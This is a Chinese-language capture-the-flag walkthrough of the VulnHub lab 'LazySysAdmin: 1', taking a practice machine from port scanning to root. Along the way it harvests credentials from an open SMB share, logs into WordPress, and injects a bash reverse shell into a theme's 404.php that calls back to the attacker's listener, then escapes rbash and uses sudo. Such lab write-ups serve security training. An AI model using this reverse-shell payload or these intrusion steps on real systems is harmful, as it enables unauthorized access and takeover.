# LazySysAdmin: 1

2024-6-12 https://www.vulnhub.com/entry/lazysysadmin-1,205/

difficulty: Beginner - Intermediate

## IP

101.1.0.169

## Scan

Open Port -> 22,80,139,445,3306,6667

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 b538660fa1eecd41693b82cfada1f713 (DSA)
|   2048 585a6369d0dadd51ccc16e00fd7e61d0 (RSA)
|   256 6130f3551a0ddec86a595bc99cb49204 (ECDSA)
|_  256 1f65c0dd15e6e421f2c19ba3b655a045 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
| http-robots.txt: 4 disallowed entries
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-generator: Silex v2.2.7
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info:
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 101.1.0.8
|_  error: Closing link: (nmap@101.1.0.8) [Client exited]
```

3306 不允许空密码登陆。

看看 smb 是否有映射信息， enum4linux -a 101.1.0.169 smbclient -L //101.1.0.169 -N

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
share$          Disk      Sumshare
IPC$            IPC       IPC Service (Web server)

Reconnecting with SMB1 for workgroup listing.
```

这里提示要对 SMB1 进行枚举，看看 share$ 有什么:

```
smbclient -N //101.1.0.169/share$

ls

smb: \> ls
.                                   D        0  Tue Aug 15 19:05:52 2017
..                                  D        0  Mon Aug 14 20:34:47 2017
wordpress                           D        0  Wed Jun 12 19:43:37 2024
Backnode_files                      D        0  Mon Aug 14 20:08:26 2017
wp                                  D        0  Tue Aug 15 18:51:23 2017
deets.txt                           N      139  Mon Aug 14 20:20:05 2017
robots.txt                          N       92  Mon Aug 14 20:36:14 2017
todolist.txt                        N       79  Mon Aug 14 20:39:56 2017
apache                              D        0  Mon Aug 14 20:35:19 2017
index.html                          N    36072  Sun Aug  6 13:02:15 2017
info.php                            N       20  Tue Aug 15 18:55:19 2017
test                                D        0  Mon Aug 14 20:35:10 2017
old                                 D        0  Mon Aug 14 20:35:13 2017

3029776 blocks of size 1024. 1241488 blocks available
```

deets.txt 有提示信息：

```
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345

```

进入到 wordpress 文件夹，找到了 wp-config.php 文件，看到了数据库的配置信息：

```
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

smb 无上传权限，无法上传 web shell

mysql 无法远程连接，再看 80 web 服务吧，首页没看出有什么提示，源码也查看了没有，使用 gobuster 进行扫描:

```
gobuster -t 32 dir -u http://101.1.0.169/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,rar,zip,sql,bak -e

http://101.1.0.169/index.html           (Status: 200) [Size: 36072]
http://101.1.0.169/info.php             (Status: 200) [Size: 77147]
http://101.1.0.169/wordpress            (Status: 301) [Size: 313] [--> http://101.1.0.169/wordpress/]
http://101.1.0.169/test                 (Status: 301) [Size: 308] [--> http://101.1.0.169/test/]
http://101.1.0.169/wp                   (Status: 301) [Size: 306] [--> http://101.1.0.169/wp/]
http://101.1.0.169/apache               (Status: 301) [Size: 310] [--> http://101.1.0.169/apache/]
http://101.1.0.169/old                  (Status: 301) [Size: 307] [--> http://101.1.0.169/old/]
http://101.1.0.169/javascript           (Status: 301) [Size: 314] [--> http://101.1.0.169/javascript/]
http://101.1.0.169/robots.txt           (Status: 200) [Size: 92]
http://101.1.0.169/phpmyadmin           (Status: 301) [Size: 314] [--> http://101.1.0.169/phpmyadmin/]
http://101.1.0.169/todolist.txt         (Status: 200) [Size: 79]
```

http://101.1.0.169/robots.txt :

```
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/
```

http://101.1.0.169/Backnode_files/ 只有这个目录有信息，看了几个文件都没有什么价值。

直接看 http://101.1.0.169/wordpress/ 这个 wordpress 吧，访问后，发现首页一直提醒一个用户名 togie

直接使用 wpscan 进行相关扫描：

```
wpscan --url http://101.1.0.169/wordpress/ -e u
```

Admin 和 admin 发现 2 个用户。

Admin 用户和上面数据库中发现的用户一致，狠有可能密码也是一致，使用 Admin:TogieMYSQL12345^^ 登陆 wordpress 登陆成功。

建立反弹 shell，kali 建立 8888 监听:

```
http://101.1.0.169/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen&scrollto=0

system("/bin/bash -c '/bin/bash -i >& /dev/tcp/101.1.0.8/8888 0>&1'");

curl http://101.1.0.169/wordpress/wp-content/themes/twentyfifteen/404.php
```

得到了反弹的 shell：

```
<ww/html/wordpress/wp-content/themes/twentyfifteen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

/home 目录下只发现了一个用户 togie，其他的枚举也没发现可提权路径，看样子需要先升级到这个用户，尝试用前面发现的密码 12345 切换，能切换到 togie，发现 togie 的 bash 是 rbash,有限制，需要进行升级。

使用 ssh 重新登陆，并指定 bash:

```
ssh togie@101.1.0.169 -t "bash --noprofile"

输入密码 12345
```

sudo -l 发现有全部权限：

```
(ALL : ALL) ALL
```

直接提权到 root：

```
togie@LazySysAdmin:~$ sudo su
root@LazySysAdmin:/home/togie# id
uid=0(root) gid=0(root) groups=0(root)
root@LazySysAdmin:/home/togie# cd /root
root@LazySysAdmin:~# ls
proof.txt
root@LazySysAdmin:~# cat proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie


Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
```
